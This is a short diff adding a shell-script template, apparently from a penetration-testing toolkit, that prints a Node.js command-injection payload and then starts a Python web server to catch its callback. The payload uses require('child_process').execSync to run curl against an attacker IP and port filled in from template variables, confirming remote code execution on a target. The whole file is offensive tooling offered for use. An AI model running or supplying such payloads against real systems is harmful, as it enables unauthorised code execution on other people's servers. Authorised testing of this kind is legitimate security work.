@@ -1,0 +1,9 @@
+mkdir -p packstation/outbound; \
+echo '================================================================'; \
+echo '                       -----Application------                         '; \
+echo 'Deliver payload: require("child_process").execSync("curl http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/callback");'; \
+echo '                       -----Linux------                         '; \
+echo 'Observe the callback below:                                     '; \
+echo '================================================================'; \
+python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+
